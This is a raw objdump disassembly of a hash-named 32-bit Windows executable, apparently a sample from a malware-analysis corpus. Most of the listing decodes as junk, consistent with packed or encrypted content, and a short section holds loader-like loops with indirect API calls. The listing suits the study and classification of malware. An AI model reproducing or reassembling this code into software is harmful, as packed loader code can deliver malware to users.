
e8014b8b0551560283239e0ac3904b283a18b4fb1cfe022cbfa1f2781d6a14ad.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x42a795
  40100c:	jmp    0x4012ab
  401011:	(bad)  
  401012:	into   
  401013:	(bad)  
  401014:	rcr    edx,cl
  401016:	(bad)  
  401018:	aad    0xdf
  40101a:	mov    ebx,0xf8e80cf7
  40101f:	ins    BYTE PTR es:[edi],dx
  401020:	jg     0x40109a
  401022:	js     0x40109c
  401024:	js     0x401024
  401026:	jle    0x4010a0
  401028:	js     0x400ff2
  40102a:	xlat   BYTE PTR ds:[ebx]
  40102b:	cmp    eax,0xcfdbc1d5
  401030:	fld    st(6)
  401032:	pop    es
  401033:	push   es
  401034:	or     eax,DWORD PTR ds:0x3b080a6d
  40103a:	bswap  edx
  40103c:	and    al,bh
  40103e:	sbb    bl,BYTE PTR [edi]
  401040:	inc    ecx
  401041:	bound  ecx,QWORD PTR [edx]
  401043:	mov    bh,0xdd
  401045:	or     bh,ch
  401047:	mov    ebp,0x880bd0e3
  40104c:	and    BYTE PTR [eax+0x1549a4f6],bh
  401052:	lods   eax,DWORD PTR ds:[esi]
  401053:	fadd   DWORD PTR [eax+0x1f]
  401056:	pusha  
  401057:	out    dx,al
  401058:	outs   dx,DWORD PTR ds:[esi]
  401059:	adc    ebx,DWORD PTR [ecx]
  40105b:	sahf   
  40105c:	add    dl,al
  40105e:	dec    edx
  40105f:	lods   al,BYTE PTR ds:[esi]
  401060:	pop    ebx
  401061:	sub    eax,0xad3ec6d9
  401066:	mov    WORD PTR [ebx],es
  401068:	lds    esi,FWORD PTR [ebx-0x76243a00]
  40106e:	adc    eax,0x3af3c19a
  401074:	xchg   ebx,eax
  401075:	icebp  
  401076:	dec    edi
  401077:	loopne 0x401019
  401079:	dec    ecx
  40107a:	call   DWORD PTR [edi-0x234ef85e]
  401080:	mov    ebp,0x5530ed4d
  401085:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  40108c:	sbb    ebx,ecx
  40108e:	xchg   esp,eax
  40108f:	sub    esi,edx
  401091:	repz pop eax
  401093:	(bad)  
  401094:	out    0x42,al
  401096:	cli    
  401097:	in     al,dx
  401098:	xchg   esp,eax
  401099:	cmp    edi,ecx
  40109b:	jbe    0x401102
  40109d:	xlat   BYTE PTR ds:[ebx]
  40109e:	sub    cl,ch
  4010a0:	add    al,0xe1
  4010a2:	sbb    DWORD PTR [ecx-0x60],ebx
  4010a5:	xor    eax,0x2696f0b
  4010aa:	adc    bh,BYTE PTR [ecx]
  4010ac:	fisttp QWORD PTR [eax+0x7f753256]
  4010b2:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010b8:	arpl   WORD PTR [ebp-0x23],dx
  4010bb:	rcl    BYTE PTR [ecx],1
  4010bd:	fistp  DWORD PTR [esi-0x1f]
  4010c0:	and    DWORD PTR [ecx-0x68],edi
  4010c3:	inc    eax
  4010c4:	push   ebx
  4010c5:	aaa    
  4010c6:	adc    eax,0x1c317733
  4010cb:	fstp   TBYTE PTR [eax]
  4010cd:	dec    edi
  4010ce:	repnz into 
  4010d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010d1:	shl    BYTE PTR [edi-0x14],0xcb
  4010d5:	xor    al,0x70
  4010d7:	push   0x94a0116
  4010dc:	ja     0x4010b2
  4010de:	dec    esi
  4010df:	push   edi
  4010e0:	sub    bh,BYTE PTR [edx]
  4010e2:	into   
  4010e3:	jl     0x4010c7
  4010e5:	jbe    0x4010a3
  4010e7:	int3   
  4010e8:	shl    BYTE PTR [ebx+ecx*4+0x3a887c8a],0x95
  4010f0:	push   cs
  4010f1:	jmp    0xdd4d:0xf81788c3
  4010f8:	adc    esi,DWORD PTR [edx+ebp*1]
  4010fb:	mov    ah,0xb0
  4010fd:	outs   dx,DWORD PTR ds:[esi]
  4010fe:	lea    ebx,[ebp-0x56]
  401101:	jp     0x401087
  401103:	mov    edx,0xb84dd7f
  401108:	cld    
  401109:	inc    eax
  40110a:	or     al,0x10
  40110c:	adc    al,0x2b
  40110e:	sbb    DWORD PTR [ecx],ecx
  401110:	enter  0x1481,0x85
  401114:	lock sub al,0x3c
  401117:	shl    BYTE PTR [edx-0x38],cl
  40111a:	xchg   ebx,eax
  40111c:	push   eax
  40111d:	xchg   edx,eax
  40111e:	cmp    eax,0x96595355
  401123:	out    dx,al
  401124:	in     al,dx
  401125:	fcomi  st,st(1)
  401127:	xor    al,0xf8
  401129:	inc    esp
  40112a:	les    ebx,FWORD PTR [ecx]
  40112c:	jg     0x4010fa
  40112e:	push   esp
  40112f:	inc    edx
  401130:	pop    es
  401131:	or     eax,0xf517db45
  401136:	pop    es
  401137:	cmp    eax,DWORD PTR [ecx]
  401139:	and    al,0x8e
  40113b:	push   ss
  40113c:	fcomp  QWORD PTR [edx]
  40113e:	push   esp
  40113f:	sub    DWORD PTR [ebx],edi
  401141:	fwait
  401142:	out    0xab,eax
  401144:	nop
  401145:	jmp    0x7e9b3af8
  40114a:	les    esi,FWORD PTR [ecx+0x13]
  40114d:	jge    0x4010d2
  40114f:	fdivrp st(4),st
  401151:	mov    bl,0x23
  401153:	add    edx,DWORD PTR [ebp+eiz*4+0x6288eafe]
  40115a:	test   al,0xc
  40115c:	mov    ds:0xa2e8f73a,eax
  401161:	in     eax,0xb0
  401163:	xchg   ebp,eax
  401164:	pop    ecx
  401165:	lahf   
  401166:	mov    ch,0x6f
  401168:	scas   al,BYTE PTR es:[edi]
  401169:	or     dl,BYTE PTR [edx-0x36f4a019]
  40116f:	jmp    0xfb50:0xe2226a17
  401176:	mov    dh,0x16
  401178:	mov    dl,0xa3
  40117a:	sub    eax,0xef5f6f30
  40117f:	(bad)  
  401180:	out    0x9,al
  401182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401183:	lds    ebp,FWORD PTR [esi-0x54c71c98]
  401189:	pop    edi
  40118a:	test   DWORD PTR [ebp-0x24023d6d],ebx
  401190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401191:	shl    DWORD PTR [edi-0x672996cf],1
  401197:	daa    
  401198:	push   esp
  401199:	cmp    eax,0x92da04be
  40119e:	push   esi
  40119f:	rcl    BYTE PTR [ecx-0x74],0x3a
  4011a3:	daa    
  4011a4:	fild   DWORD PTR [esi-0x5e]
  4011a7:	push   ss
  4011a8:	adc    BYTE PTR [ecx],al
  4011aa:	jo     0x401198
  4011ac:	and    ch,BYTE PTR [esi]
  4011ae:	aad    0xd6
  4011b0:	dec    edx
  4011b1:	adc    al,0x6a
  4011b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4011b4:	lea    esi,[ebp-0x6]
  4011b7:	sahf   
  4011b8:	mov    edi,0x7f86c21f
  4011bd:	test   BYTE PTR [esi+ebx*4-0x70c74840],dl
  4011c4:	rcr    ebp,1
  4011c6:	data16 sahf 
  4011c8:	and    eax,0xec17dff1
  4011cd:	sbb    eax,0x602ffb9b
  4011d2:	xor    ebp,eax
  4011d4:	ins    BYTE PTR es:[edi],dx
  4011d5:	ja     0x401198
  4011d7:	adc    ch,BYTE PTR [edi]
  4011d9:	int    0xb1
  4011db:	retf   0x8a1
  4011de:	sbb    esp,DWORD PTR [edx-0x69]
  4011e1:	dec    edx
  4011e2:	mov    ds:0x1628262f,al
  4011e7:	in     al,dx
  4011e8:	in     al,0x17
  4011ea:	out    dx,eax
  4011eb:	add    al,0x27
  4011ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4011ee:	es cld 
  4011f0:	xchg   esi,eax
  4011f1:	js     0x4011c8
  4011f3:	fistp  WORD PTR [edx]
  4011f5:	fidiv  DWORD PTR [ebp-0x6c]
  4011f8:	inc    esi
  4011f9:	sbb    ecx,DWORD PTR [eax-0x765da714]
  4011ff:	mov    esp,0x552acd17
  401204:	lea    ebp,[ebx]
  401206:	inc    esi
  401207:	mov    ?,WORD PTR [edx-0x3cd5f39f]
  40120d:	mov    es,WORD PTR [edx-0xbabc3b5]
  401213:	adc    al,0x9c
  401215:	sbb    al,0xaf
  401217:	add    eax,0xda9ae47f
  40121c:	(bad)  
  40121e:	fmulp  st(3),st
  401220:	push   eax
  401221:	mov    es,WORD PTR [edi]
  401223:	adc    DWORD PTR [esi+0x2be4c2d3],esi
  401229:	pop    ebx
  40122a:	add    BYTE PTR [esi-0x31],al
  40122d:	ficom  DWORD PTR [eax+0x64]
  401230:	fisub  WORD PTR [eax]
  401232:	dec    ebp
  401233:	cmc    
  401234:	inc    eax
  401235:	xchg   ecx,eax
  401236:	ret    0xebf0
  401239:	fnstsw WORD PTR [ebp+0x1143ae98]
  40123f:	shl    BYTE PTR [edi-0x1a9e8c35],0x39
  401246:	daa    
  401247:	gs icebp 
  401249:	popa   
  40124a:	push   ss
  40124b:	sbb    dh,BYTE PTR [edx]
  40124d:	adc    al,0xa8
  40124f:	in     eax,dx
  401250:	and    bl,BYTE PTR [esi+0xf]
  401253:	js     0x401274
  401255:	aaa    
  401256:	xchg   edx,eax
  401257:	jno    0x40125f
  401259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40125a:	aam    0xd4
  40125c:	in     al,0xac
  40125e:	xchg   edi,eax
  40125f:	retf   
  401260:	dec    ecx
  401261:	mov    dl,0x78
  401263:	add    BYTE PTR [ebx+0x18],dh
  401266:	pop    ss
  401267:	bound  edx,QWORD PTR [esi+0x8]
  40126a:	pop    ebx
  40126b:	imul   ebp,DWORD PTR [eax],0x80a271bc
  401271:	xchg   dh,al
  401273:	or     BYTE PTR [eax],cl
  401275:	xchg   DWORD PTR [edx-0x1e],esp
  401278:	and    BYTE PTR [ebp-0x77],0xe4
  40127c:	js     0x401227
  40127e:	and    BYTE PTR [eax-0xad4101a],bh
  401284:	jmp    0x401211
  401286:	mov    ch,0x5
  401288:	jp     0x401227
  40128a:	fwait
  40128b:	jge    0x40123e
  40128d:	push   edx
  40128e:	dec    edx
  40128f:	adc    esp,DWORD PTR [esi]
  401291:	add    DWORD PTR [esp+eiz*2],ebx
  401294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401295:	sbb    eax,0x3585a586
  40129a:	mov    ah,BYTE PTR [ebp-0xd142087]
  4012a0:	sar    DWORD PTR [ebp-0x7c2f8038],0xd6
  4012a7:	sub    bh,al
  4012a9:	add    al,0xa6
  4012ab:	mov    eax,ds:0x41eae6
  4012b0:	xor    DWORD PTR ds:0x42a82d,edx
  4012b6:	mov    eax,DWORD PTR [eax+0x198]
  4012bc:	mov    ecx,DWORD PTR ds:0x42a7e1
  4012c2:	or     DWORD PTR ds:0x42a78d,ecx
  4012c8:	mov    DWORD PTR [ebp-0x8],eax
  4012cb:	mov    DWORD PTR ds:0x42a77d,0x436b
  4012d5:	mov    eax,DWORD PTR [ebp+0x8]
  4012d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4012db:	push   ebx
  4012dc:	or     DWORD PTR ds:0x42a7e1,edx
  4012e2:	push   esi
  4012e3:	add    esi,DWORD PTR ds:0x42a7d5
  4012e9:	mov    esi,0x7510850
  4012ee:	and    ebx,0x1c58
  4012f4:	xor    eax,esi
  4012f6:	and    DWORD PTR ds:0x42a859,0x0
  401300:	jmp    0x401312
  401305:	mov    ebx,DWORD PTR ds:0x42a859
  40130b:	inc    ebx
  40130c:	mov    DWORD PTR ds:0x42a859,ebx
  401312:	cmp    DWORD PTR ds:0x42a859,0x11
  401319:	jae    0x401344
  40131f:	cmp    DWORD PTR ds:0x42a859,0x16
  401326:	jne    0x401335
  40132c:	push   DWORD PTR [ebp-0x1c]
  40132f:	call   DWORD PTR ds:0x41d180
  401335:	jmp    0x401305
  40133a:	adc    DWORD PTR ds:0x42a7a1,0x42a825
  401344:	push   edi
  401345:	and    DWORD PTR ds:0x42a829,0x0
  40134f:	jmp    0x401361
  401354:	mov    edi,DWORD PTR ds:0x42a829
  40135a:	inc    edi
  40135b:	mov    DWORD PTR ds:0x42a829,edi
  401361:	cmp    DWORD PTR ds:0x42a829,0x1d
  401368:	jae    0x4013a9
  40136e:	cmp    DWORD PTR ds:0x42a829,0xe
  401375:	jne    0x401384
  40137b:	push   DWORD PTR [ebp-0x10]
  40137e:	call   DWORD PTR ds:0x41d0b4
  401384:	cmp    DWORD PTR ds:0x42a829,0xd
  40138b:	jne    0x40139e
  401391:	mov    edi,DWORD PTR ds:0x42a829
  401397:	inc    edi
  401398:	mov    DWORD PTR ds:0x42a829,edi
  40139e:	jmp    0x401354
  4013a3:	sub    DWORD PTR ds:0x42a7d5,edx
  4013a9:	mov    edi,0x327298
  4013ae:	mov    DWORD PTR ds:0x42a78d,0x11
  4013b8:	cmp    DWORD PTR ds:0x42a78d,0x0
  4013bf:	je     0x4016af
  4013c5:	cmp    DWORD PTR ds:0x42a78d,0x2
  4013cc:	jne    0x4013e4
  4013d2:	push   0x42a7d5
  4013d7:	push   0x0
  4013d9:	push   0x42a9ed
  4013de:	call   DWORD PTR ds:0x41d0b8
  4013e4:	cmp    DWORD PTR ds:0x42a78d,0x3
  4013eb:	jne    0x4013fe
  4013f1:	mov    ebx,DWORD PTR ds:0x42a78d
  4013f7:	dec    ebx
  4013f8:	mov    DWORD PTR ds:0x42a78d,ebx
  4013fe:	mov    ebx,DWORD PTR ds:0x42a78d
  401404:	dec    ebx
  401405:	mov    DWORD PTR ds:0x42a78d,ebx
  40140b:	jmp    0x4013b8
  401410:	jmp    0x4016af
  401415:	leave  
  401416:	rol    dh,0xcf
  401419:	leave  
  40141a:	int    0xd9
  40141c:	fimul  DWORD PTR [edx]
  40141e:	leave  
  40141f:	rcl    BYTE PTR [ecx+0x57],1
  401422:	lea    ebx,[ebx+0x787efe7c]
  401428:	js     0x401428
  40142a:	jle    0x4014a4
  40142c:	js     0x401483
  40142e:	pop    es
  40142f:	dec    esi
  401430:	jmp    0x4013e8
  401432:	inc    edx
  401433:	mul    BYTE PTR [ebp-0xc174898]
  401439:	xor    al,0xe1
  40143b:	and    al,0x94
  40143d:	xchg   ecx,eax
  40143e:	cmp    edx,DWORD PTR [ebx+0x36bd3739]
  401444:	int3   
  401445:	xchg   ebp,eax
  401446:	fcom   QWORD PTR [eax-0x3b]
  401449:	xor    BYTE PTR [edx],bl
  40144b:	jae    0x40145a
  40144d:	gs dec ecx
  40144f:	xor    DWORD PTR [edx],ebp
  401451:	mov    esi,esp
  401453:	out    0xd,al
  401455:	xchg   esp,eax
  401456:	out    0xa4,al
  401458:	sar    BYTE PTR [ebp+0x34d6ab37],cl
  40145e:	dec    ebx
  40145f:	adc    BYTE PTR [edi],cl
  401461:	mov    esi,0xae89be3d
  401466:	rcr    DWORD PTR [ecx+ebp*4-0x1e],1
  40146a:	hlt    
  40146b:	xchg   BYTE PTR [edx],ah
  40146d:	test   BYTE PTR [esi],dh
  40146f:	pop    esp
  401470:	xchg   esi,eax
  401471:	call   0x64d5c74e
  401476:	mov    bh,BYTE PTR [ecx]
  401478:	cmp    edi,DWORD PTR [bp+si]
  40147b:	fadd   DWORD PTR [ebx]
  40147d:	div    edi
  40147f:	mov    ah,0x10
  401481:	into   
  401482:	repz xchg edi,eax
  401484:	xor    eax,0x6e9ef66c
  401489:	aam    0xc1
  40148b:	and    bh,BYTE PTR [ebx]
  40148d:	mov    esi,0x736d2502
  401492:	inc    ebx
  401493:	out    0x5e,al
  401495:	popf   
  401496:	int3   
  401497:	sbb    BYTE PTR [ebp+0x67fec33],al
  40149d:	out    0x70,al
  40149f:	inc    ecx
  4014a0:	iret   
  4014a1:	xlat   BYTE PTR ds:[ebx]
  4014a2:	es push ecx
  4014a4:	rol    DWORD PTR [edi],0xaa
  4014a7:	jb     0x40142d
  4014a9:	test   al,0x3c
  4014ab:	push   edi
  4014ac:	call   0xb5e1:0xa0e76bb3
  4014b3:	outs   dx,DWORD PTR ds:[esi]
  4014b4:	hlt    
  4014b5:	std    
  4014b6:	ds inc edx
  4014b8:	sbb    DWORD PTR [esi-0x886bf98],esp
  4014be:	inc    eax
  4014bf:	rol    dh,cl
  4014c1:	or     DWORD PTR [ecx+0x6c253c0d],edi
  4014c7:	in     al,dx
  4014c8:	adc    dl,al
  4014ca:	jne    0x401451
  4014cc:	push   eax
  4014cd:	and    dl,BYTE PTR [esi+ebx*2-0x30]
  4014d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014d2:	or     al,0x73
  4014d4:	xchg   DWORD PTR [ebx],edi
  4014d6:	hlt    
  4014d7:	sbb    esi,DWORD PTR [ebx]
  4014d9:	sbb    al,0xd5
  4014db:	retf   
  4014dc:	rcr    dh,1
  4014de:	mov    eax,ds:0x1cdd32ce
  4014e3:	sbb    BYTE PTR [ebx+0x5a],ch
  4014e6:	pusha  
  4014e7:	data16 sahf 
  4014e9:	add    eax,0x357668c6
  4014ee:	in     al,dx
  4014ef:	sar    ecx,cl
  4014f1:	ret    
  4014f2:	jl     0x4014cc
  4014f4:	jp     0x401513
  4014f6:	cmc    
  4014f7:	imul   ecx,DWORD PTR [esi-0x75a3b54b],0xffffffd9
  4014fe:	jae    0x401494
  401500:	jge    0x4014ec
  401502:	mov    ds:0xfa79814,al
  401507:	aaa    
  401508:	inc    ecx
  401509:	jb     0x401494
  40150b:	sahf   
  40150c:	test   BYTE PTR [esi-0x2b],bh
  40150f:	push   esp
  401510:	xchg   ebx,eax
  401511:	push   ecx
  401512:	push   ecx
  401513:	lds    ecx,FWORD PTR ds:[ebx]
  401516:	dec    ecx
  401517:	push   esi
  401518:	push   ss
  401519:	or     esi,DWORD PTR [eax+esi*8+0xba49043]
  401520:	mov    bh,0xb0
  401522:	and    eax,0x19e080e
  401527:	lock int3 
  401529:	sub    DWORD PTR [edi-0x75],edx
  40152c:	adc    cl,BYTE PTR [ebp+0x533399ae]
  401532:	sbb    DWORD PTR [eax+0x65],ecx
  401535:	das    
  401536:	fadd   QWORD PTR [ebp-0x9088a2e]
  40153c:	pop    esi
  40153d:	ss stc 
  40153f:	(bad)
  401543:	clc    
  401544:	pop    ss
  401545:	fs pop ecx
  401547:	push   cs
  401548:	dec    eax
  401549:	retf   0x8415
  40154c:	jo     0x401574
  40154e:	dec    ecx
  40154f:	cmp    al,0x50
  401551:	adc    al,0xb7
  401553:	dec    edi
  401554:	push   es
  401555:	(bad)  
  401556:	mov    eax,?
  401558:	jne    0x4014f0
  40155a:	repnz addr16 popf 
  40155d:	jmp    0x40151c
  40155f:	sbb    edx,DWORD PTR [ecx+0x75]
  401562:	sbb    dl,al
  401564:	mov    ecx,0xc377c57a
  401569:	xchg   ebp,eax
  40156a:	in     al,0x84
  40156c:	(bad)  
  40156d:	jge    0x401588
  40156f:	sbb    ch,BYTE PTR [ecx]
  401571:	xchg   DWORD PTR [ebx-0x12],esp
  401574:	push   cs
  401575:	jp     0x401549
  401577:	fdivrp st(3),st
  401579:	ds stos BYTE PTR es:[edi],al
  40157b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40157c:	and    esp,DWORD PTR [edi]
  40157e:	push   ss
  40157f:	add    esi,DWORD PTR [ebp+0xb]
  401582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401583:	jo     0x4015c3
  401585:	add    dh,BYTE PTR [esi-0x425868e5]
  40158b:	test   al,0x1c
  40158d:	ret    
  40158e:	retf   
  40158f:	sub    DWORD PTR [edx],ebp
  401591:	scas   eax,DWORD PTR es:[edi]
  401592:	sub    dl,BYTE PTR [eax+0x2c6812fc]
  401598:	cmp    ebp,esp
  40159a:	mov    dh,0xd2
  40159c:	loopne 0x401572
  40159e:	jb     0x401576
  4015a0:	jmp    0xc3891dbe
  4015a5:	icebp  
  4015a6:	mov    ebp,0x4e4d21de
  4015ab:	fld    QWORD PTR [ebp+eax*2+0x4d1ec021]
  4015b2:	jne    0x401543
  4015b4:	xchg   esp,eax
  4015b5:	push   ebp
  4015b6:	sbb    esi,DWORD PTR [ebx+0x4dfc2d22]
  4015bc:	ror    DWORD PTR [esi],0x87
  4015bf:	sbb    edi,DWORD PTR [ebp-0x41208a1b]
  4015c5:	jmp    0xe7fa7de3
  4015ca:	xor    ebp,DWORD PTR [ebx-0xe]
  4015cd:	ret    
  4015ce:	(bad)  
  4015cf:	call   0xc38fe440
  4015d4:	in     eax,dx
  4015d5:	cld    
  4015d6:	retf   0x5bdd
  4015d9:	es inc ebp
  4015db:	mov    al,ds:0xd3588c5b
  4015e1:	xchg   esi,eax
  4015e2:	push   cs
  4015e3:	mul    ebp
  4015e5:	mov    dl,dh
  4015e7:	mov    esi,ecx
  4015e9:	in     al,0xbc
  4015eb:	inc    ecx
  4015ec:	jmp    0x4015f3
  4015ee:	inc    ebp
  4015ef:	imul   ecx,esp,0x6b
  4015f2:	adc    ebp,DWORD PTR ds:[bx+si-0xfcd]
  4015f8:	scas   eax,DWORD PTR es:[edi]
  4015f9:	mov    bl,0x29
  4015fb:	in     eax,0x23
  4015fd:	sub    DWORD PTR [ebp+0x1d2f8255],0x480f9a74
  401607:	(bad)  ds:0x82956610
  40160d:	push   edx
  40160e:	jbe    0x40159f
  401610:	inc    ebp
  401611:	or     eax,0x8c142bed
  401616:	lods   eax,DWORD PTR ds:[esi]
  401617:	adc    bh,BYTE PTR [edi+0x5542166d]
  40161d:	push   ecx
  40161e:	xor    eax,0x82c7ee4d
  401623:	jge    0x40162b
  401625:	mov    DWORD PTR [edi+0x2],esp
  401628:	frstor [edx+0x18]
  40162b:	and    al,0xe6
  40162d:	sbb    edx,esp
  40162f:	xchg   ebp,eax
  401630:	stos   DWORD PTR es:[edi],eax
  401631:	imul   edx,DWORD PTR [edi-0x6b],0xffffffe5
  401635:	daa    
  401636:	hlt    
  401637:	or     eax,0xe1de090
  40163c:	pop    DWORD PTR [ebx]
  40163e:	and    cl,bl
  401640:	rol    BYTE PTR [eax+edi*2],0xd6
  401644:	jge    0x40168c
  401646:	ss rol DWORD PTR cs:[eax],cl
  40164a:	in     al,0x60
  40164c:	cmp    al,0x3a
  40164e:	(bad)  
  40164f:	sti    
  401650:	mov    cl,0x11
  401652:	lods   al,BYTE PTR ds:[esi]
  401653:	mov    edi,0x91d06a80
  401658:	xor    DWORD PTR [edi],esp
  40165a:	pop    ebx
  40165b:	(bad)  
  40165d:	xchg   ecx,eax
  40165e:	loope  0x40160e
  401660:	repz fiadd WORD PTR [edx+eiz*1+0x28284fbc]
  401668:	xchg   edi,eax
  401669:	shl    ecx,1
  40166b:	sahf   
  40166c:	dec    eax
  40166d:	and    BYTE PTR [esi-0x2e],dh
  401670:	mov    cl,0xaa
  401672:	test   BYTE PTR [esi],ah
  401674:	test   al,0xdc
  401676:	in     eax,0x8
  401678:	jle    0x401605
  40167a:	fwait
  40167b:	addr16 test al,0xe
  40167e:	push   ecx
  40167f:	out    dx,al
  401680:	and    bh,BYTE PTR [ecx+eiz*2]
  401683:	imul   ebp,DWORD PTR [edi],0x6bb4794f
  401689:	dec    edi
  40168a:	xchg   edx,eax
  40168b:	aaa    
  40168c:	mov    ds:0xc443455d,al
  401691:	ds or  eax,0x19f472d5
  401697:	jno    0x40167b
  401699:	jbe    0x40165d
  40169b:	inc    ecx
  40169c:	aam    0xce
  40169e:	mov    cl,bl
  4016a0:	retf   
  4016a1:	mov    ebx,0x8f43b213
  4016a6:	rdmsr  
  4016a8:	mov    ecx,0x54e45ca0
  4016ad:	dec    ecx
  4016ae:	push   0x3
  4016b0:	mov    DWORD PTR [ecx+0x42a86d35],0x53dc00
  4016ba:	add    BYTE PTR [ecx-0x26c2eeff],cl
  4016c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016c1:	inc    edx
  4016c2:	add    BYTE PTR [ebp+0xd81fc45],cl
  4016c8:	mov    DWORD PTR [edi-0x5882ffbe],esp
  4016ce:	inc    edx
  4016cf:	add    BYTE PTR [ecx+0x1d31f045],cl
  4016d5:	lea    esp,[edi+0x458b0042]
  4016db:	or     bh,dh
  4016dd:	(bad)  [ebx-0x39cc0fb3]
  4016e3:	jmp    0x401982
  4016e8:	ret    0x3dc5
  4016eb:	ret    
  4016ec:	leave  
  4016ed:	retf   
  4016ee:	ret    0xebc5
  4016f1:	out    0x4b,eax
  4016f3:	xrelease xchg DWORD PTR [eax],edx
  4016f6:	xchg   edx,eax
  4016f7:	or     al,0x7c
  4016f9:	add    edi,DWORD PTR [eax+0x78]
  4016fc:	(bad)  
  4016fd:	jle    0x401777
  4016ff:	js     0x4016bc
  401701:	jle    0x4016ba
  401703:	sub    eax,DWORD PTR [edi-0x5c]
  401706:	lods   eax,DWORD PTR ds:[esi]
  401707:	xchg   BYTE PTR [edi],cl
  401709:	mov    ch,0x68
  40170b:	jns    0x40176a
  40170d:	xchg   ebx,eax
  40170e:	(bad)  
  40170f:	xlat   BYTE PTR ds:[ebx]
  401710:	repz ja 0x40174b
  401713:	pop    ebx
  401714:	popf   
  401715:	mov    edx,0xdfeb996a
  40171a:	dec    edx
  40171b:	inc    edi
  40171c:	and    al,0x9b
  40171e:	imul   ebp,edx,0x68
  401721:	inc    eax
  401722:	pop    es
  401723:	outs   dx,DWORD PTR ds:[esi]
  401724:	cmp    eax,0x81fb7743
  401729:	cmc    
  40172a:	adc    DWORD PTR ds:0x202fdf51,0xb93f6fb5
  401734:	mov    ah,0xd7
  401736:	mov    ch,0x86
  401738:	clc    
  401739:	call   0x895f56cc
  40173e:	pop    eax
  40173f:	sub    ch,BYTE PTR [eax]
  401741:	mov    bh,0x5e
  401743:	inc    edx
  401744:	xor    BYTE PTR [eax-0x51b6f18b],cl
  40174a:	ficomp WORD PTR ds:0xba01ba03
  401750:	jmp    0x4017b1
  401752:	xlat   BYTE PTR ds:[ebx]
  401753:	jno    0x4017ae
  401755:	nop
  401756:	or     eax,0xb2cd86b1
  40175b:	sbb    DWORD PTR [edx+eiz*1],edx
  40175e:	add    ebx,DWORD PTR [ecx]
  401760:	and    DWORD PTR [ebp+0x1bea7982],eax
  401766:	arpl   WORD PTR ds:0xd2045f97,sp
  40176c:	sahf   
  40176d:	cmp    eax,0x14476292
  401772:	add    eax,DWORD PTR [edx+0x5002d33e]
  401778:	xchg   edx,eax
  401779:	retf   0x2342
  40177c:	mov    edx,0x51e11299
  401781:	scas   eax,DWORD PTR es:[edi]
  401782:	fist   WORD PTR [ecx-0x7b593f50]
  401788:	sar    al,1
  40178a:	jae    0x40178b
  40178c:	mov    ecx,0x26476903
  401791:	xor    ch,BYTE PTR [esi-0x5961e4c]
  401797:	stos   DWORD PTR es:[edi],eax
  401798:	mov    ebp,0x196f4e0f
  40179d:	rcl    bl,1
  40179f:	(bad)  
  4017a0:	add    esp,DWORD PTR ss:[edx-0x4050b484]
  4017a7:	fild   WORD PTR [edi]
  4017a9:	adc    ecx,esp
  4017ab:	mov    esi,DWORD PTR [ebp-0x73ef502f]
  4017b1:	mov    WORD PTR [esi+0x76],ss
  4017b4:	(bad)  
  4017b5:	adc    al,al
  4017b7:	cmp    al,0xc9
  4017b9:	loopne 0x401753
  4017bb:	pop    eax
  4017bc:	or     BYTE PTR [ebx+0x2d49fc81],ch
  4017c2:	inc    esp
  4017c3:	pop    edx
  4017c4:	inc    eax
  4017c5:	jmp    0x401797
  4017c7:	mov    ebp,0x69fb0e32
  4017cc:	std    
  4017cd:	add    BYTE PTR [ecx],0x4b
  4017d0:	pusha  
  4017d1:	(bad)  
  4017d2:	jnp    0x4017a8
  4017d4:	pop    es
  4017d5:	dec    ebx
  4017d6:	mov    esi,0x43884134
  4017db:	push   ds
  4017dc:	inc    edx
  4017dd:	std    
  4017de:	mov    ds:0x8b235f26,eax
  4017e3:	dec    esi
  4017e4:	or     al,0x3e
  4017e6:	xchg   ebp,eax
  4017e7:	inc    eax
  4017e8:	pop    ds
  4017e9:	js     0x401770
  4017eb:	xchg   bh,bh
  4017ed:	scas   eax,DWORD PTR es:[edi]
  4017ee:	cmp    cl,0x10
  4017f1:	cmp    bl,BYTE PTR [ebx+0x5f]
  4017f4:	push   ebx
  4017f5:	and    ch,BYTE PTR [esi-0x395f543a]
  4017fb:	stc    
  4017fc:	xchg   edx,eax
  4017fd:	and    BYTE PTR [edx+eiz*2-0x50a59430],ah
  401804:	out    dx,al
  401805:	jecxz  0x4017cc
  401807:	pop    ebx
  401808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401809:	xor    eax,ebx
  40180b:	sar    ecx,0xf5
  40180e:	arpl   WORD PTR [eax-0x6f],bx
  401811:	mov    esp,0x8b4f4ca3
  401816:	cmp    al,0x5f
  401818:	inc    esp
  401819:	xor    eax,DWORD PTR [eax]
  40181b:	dec    ebp
  40181c:	mov    ebp,0x79d0c0ee
  401821:	ins    DWORD PTR es:[edi],dx
  401822:	dec    edi
  401823:	std    
  401824:	sub    al,0x41
  401826:	ja     0x40181f
  401828:	push   esp
  401829:	pop    ebp
  40182a:	aaa    
  40182b:	jae    0x401880
  40182d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40182e:	lahf   
  40182f:	enter  0x49d5,0xae
  401833:	retf   0x9e25
  401836:	inc    edx
  401837:	stos   DWORD PTR es:[edi],eax
  401838:	dec    esi
  401839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40183a:	ja     0x401888
  40183c:	movaps XMMWORD PTR [esi],xmm6
  40183f:	dec    eax
  401840:	test   BYTE PTR [ebp+ebx*2-0x97a60ee],ch
  401847:	rcl    BYTE PTR [eax],0xc3
  40184a:	and    al,0x81
  40184c:	call   0x714fd1cd
  401851:	mov    ah,0xd8
  401853:	pop    ss
